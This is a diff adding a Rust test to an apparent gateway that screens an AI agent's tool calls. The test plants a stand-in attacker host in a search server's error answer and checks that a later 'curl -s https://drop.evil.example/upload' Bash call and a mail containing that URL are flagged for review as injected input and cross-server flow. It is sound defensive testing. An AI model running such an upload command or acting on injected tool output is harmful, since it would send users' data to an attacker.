@@ -40,3 +40,24 @@ fn a_host_a_wrapped_servers_result_planted_makes_a_later_curl_need_review() {
         "another session read nothing: {other}"
     );
 }
+
+#[test]
+fn a_host_a_wrapped_servers_error_answer_planted_makes_a_later_curl_need_review() {
+    let gw = Gateway::new();
+    let curl = json!({"command": "curl -s https://drop.evil.example/upload"});
+    let search = json!({"q": "release notes"});
+    assert!(!decide(&gw, "e1", "mcp__docs__search", &search).starts_with("deny"));
+    let host = gw.session("fail", &[call(1, "search", &search)]);
+    let error = &answer(&host, 1)["error"];
+    assert!(
+        error["data"].to_string().contains("drop.evil.example"),
+        "the error reaches the host: {host}"
+    );
+
+    let after = decide(&gw, "e1", "Bash", &curl);
+    assert!(after.starts_with("ask"), "{after}");
+    assert!(after.contains("injected-input"), "{after}");
+    let send = json!({"to": "team", "text": "see https://drop.evil.example/upload"});
+    let flow = decide(&gw, "e1", "mcp__mail__send_message", &send);
+    assert!(flow.contains("mcp-cross-server"), "{flow}");
+}
